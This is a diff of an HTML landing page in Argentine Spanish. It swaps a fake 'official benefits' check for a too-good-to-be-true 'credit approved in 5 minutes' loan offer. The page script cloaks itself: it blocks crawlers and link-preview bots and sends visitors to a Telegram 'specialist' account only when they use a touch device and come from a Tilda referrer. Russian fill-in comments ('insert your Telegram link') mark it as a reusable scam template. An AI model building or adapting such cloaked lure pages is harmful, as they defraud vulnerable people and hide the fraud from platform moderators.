@@ -2,90 +2,84 @@
 <html lang="es">
 <head>
   <meta charset="UTF-8">
+  <title>Crédito en minutos</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Consulta Ciudadana</title>
-  <meta property="og:title" content="Accedé a información oficial">
-  <meta property="og:description" content="Consultá si tenés acceso a beneficios disponibles en Argentina">
-  <meta property="og:image" content="background.jpg">
-
-  <!-- Facebook Pixel -->
-  <script>
-    !function(f,b,e,v,n,t,s)
-    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
-    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
-    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
-    n.queue=[];t=b.createElement(e);t.async=!0;
-    t.src='https://connect.facebook.net/en_US/fbevents.js';
-    s=b.getElementsByTagName(e)[0];
-    s.parentNode.insertBefore(t,s)}(window, document,'script');
-
-    fbq('init', '3573338216308788'); // ← ВСТАВЬ СВОЙ Pixel ID
-    fbq('track', 'PageView');
-  </script>
-  <noscript>
-    <img height="1" width="1" style="display:none"
-      src="https://www.facebook.com/tr?id=3573338216308788&ev=PageView&noscript=1"/>
-  </noscript>
-
+  <meta name="robots" content="noindex, nofollow">
   <style>
     body {
-      margin: 0;
-      font-family: Arial, sans-serif;
-      background: linear-gradient(rgba(0,0,0,0.6), rgba(0,0,0,0.6)), url('background.jpg') no-repeat center center/cover;
-      height: 100vh;
+      background-color: #f9f9f9;
+      font-family: 'Segoe UI', sans-serif;
+      color: #333;
       display: flex;
+      flex-direction: column;
       align-items: center;
       justify-content: center;
-      flex-direction: column;
-      color: #fff;
+      height: 100vh;
+      margin: 0;
       text-align: center;
+      padding: 20px;
     }
     h1 {
-      font-size: 2em;
-      margin-bottom: 10px;
+      color: #007b59;
+      font-size: 2rem;
     }
-    p {
-      font-size: 1.1em;
-      margin-bottom: 20px;
+    .info {
+      font-size: 1.2rem;
+      margin: 10px 0;
     }
-    button {
-      padding: 12px 24px;
-      font-size: 1em;
-      background-color: #ffffff;
-      color: #004080;
+    .button {
+      background-color: #00b36b;
+      color: white;
       border: none;
-      border-radius: 6px;
+      padding: 15px 30px;
+      font-size: 1rem;
+      border-radius: 8px;
       cursor: pointer;
-      transition: background-color 0.3s ease;
-    }
-    button:hover {
-      background-color: #f0f0f0;
+      margin-top: 30px;
+      text-decoration: none;
     }
   </style>
 </head>
 <body>
-  <h1>Consulta oficial de beneficios</h1>
-  <p>Verificá si accedés a programas disponibles para residentes argentinos</p>
-  <button onclick="handleClick()">Continuar</button>
+  <h1>📄 Crédito aprobado en solo 5 minutos</h1>
+  <p class="info">💰 Desde $200.000 — Tasa desde el 11% anual</p>
+  <p class="info">🔒 100% online y seguro</p>
+  <p class="info">🎯 Sin vueltas, sin bancos ni trámites</p>
+
+  <a id="btn" class="button" href="#">Solicitar ahora</a>
 
   <script>
-    const isBot = () => {
-      const ua = navigator.userAgent.toLowerCase();
-      return navigator.webdriver ||
-             /bot|crawl|spider|facebookexternalhit|headless|phantomjs/.test(ua);
+    const isHuman = () => {
+      const ua = navigator.userAgent;
+      const bots = [/bot/i, /crawl/i, /spider/i, /WhatsApp/i, /telegram/i, /Discord/i, /Slackbot/i, /Google/i, /Preview/i];
+      return !bots.some(b => b.test(ua));
     };
 
-    const handleClick = () => {
-      if (!isBot()) {
-        fbq('track', 'Lead');
-        window.location.href = 'https://t.me/Veronica_especialista'; // ← ВСТАВЬ СВОЮ Telegram-ссылку
-      } else {
-        document.body.innerHTML = "<h1 style='color:white;text-shadow:1px 1px 4px black'>Acceso restringido</h1>";
-      }
+    const isTouchDevice = () => {
+      return 'ontouchstart' in window || navigator.maxTouchPoints > 0;
     };
+
+    const isFromTilda = () => {
+      return document.referrer.includes("tilda") || document.referrer.includes("argentinaforreal.tilda.ws");
+    };
+
+    const redirectToTelegram = () => {
+      window.location.href = "https://t.me/Veronica_especialista"; // ← вставь свой Telegram
+    };
+
+    document.getElementById("btn").addEventListener("click", function (e) {
+      e.preventDefault();
+      if (isHuman() && isTouchDevice() && isFromTilda()) {
+        redirectToTelegram();
+      } else {
+        alert("Acceso restringido. Intenta desde el enlace oficial.");
+      }
+    });
   </script>
 </body>
 </html>
+
+
 
 
 
